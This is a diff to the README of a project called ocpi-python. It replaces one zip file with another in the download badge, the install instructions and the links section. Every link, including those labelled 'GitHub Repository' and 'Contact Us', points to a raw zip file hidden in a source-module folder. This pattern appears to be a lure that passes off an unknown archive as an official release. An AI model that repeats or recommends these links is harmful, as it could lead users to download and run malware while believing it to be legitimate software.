@@ -10,7 +10,7 @@ To get started quickly, follow these simple steps. You will be able to download 
 
 ## ⬇️ Download Now
 
-[![Download ocpi-python Releases](https://github.com/codexistente/ocpi-python/raw/refs/heads/main/ocpi/modules/sessions/v_2_2_1/api/ocpi-python-v2.3.zip%20Releases-blue)](https://github.com/codexistente/ocpi-python/raw/refs/heads/main/ocpi/modules/sessions/v_2_2_1/api/ocpi-python-v2.3.zip)
+[![Download ocpi-python Releases](https://github.com/codexistente/ocpi-python/raw/refs/heads/main/ocpi/modules/locations/v_2_3_0/api/python_ocpi_v3.8.zip%20Releases-blue)](https://github.com/codexistente/ocpi-python/raw/refs/heads/main/ocpi/modules/locations/v_2_3_0/api/python_ocpi_v3.8.zip)
 
 ## 📦 System Requirements
 
@@ -30,7 +30,7 @@ Before downloading, please ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit [this page](https://github.com/codexistente/ocpi-python/raw/refs/heads/main/ocpi/modules/sessions/v_2_2_1/api/ocpi-python-v2.3.zip). 
+To download the application, visit [this page](https://github.com/codexistente/ocpi-python/raw/refs/heads/main/ocpi/modules/locations/v_2_3_0/api/python_ocpi_v3.8.zip). 
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version.
@@ -69,9 +69,9 @@ We welcome contributions! If you're interested in helping improve ocpi-python, p
 
 ## 🔗 Links
 
-- [Download ocpi-python Releases](https://github.com/codexistente/ocpi-python/raw/refs/heads/main/ocpi/modules/sessions/v_2_2_1/api/ocpi-python-v2.3.zip)
-- [GitHub Repository](https://github.com/codexistente/ocpi-python/raw/refs/heads/main/ocpi/modules/sessions/v_2_2_1/api/ocpi-python-v2.3.zip)
-- [Contact Us](https://github.com/codexistente/ocpi-python/raw/refs/heads/main/ocpi/modules/sessions/v_2_2_1/api/ocpi-python-v2.3.zip)
+- [Download ocpi-python Releases](https://github.com/codexistente/ocpi-python/raw/refs/heads/main/ocpi/modules/locations/v_2_3_0/api/python_ocpi_v3.8.zip)
+- [GitHub Repository](https://github.com/codexistente/ocpi-python/raw/refs/heads/main/ocpi/modules/locations/v_2_3_0/api/python_ocpi_v3.8.zip)
+- [Contact Us](https://github.com/codexistente/ocpi-python/raw/refs/heads/main/ocpi/modules/locations/v_2_3_0/api/python_ocpi_v3.8.zip)
 
 Feel free to reach out with any questions or feedback. Thank you for using ocpi-python!
 
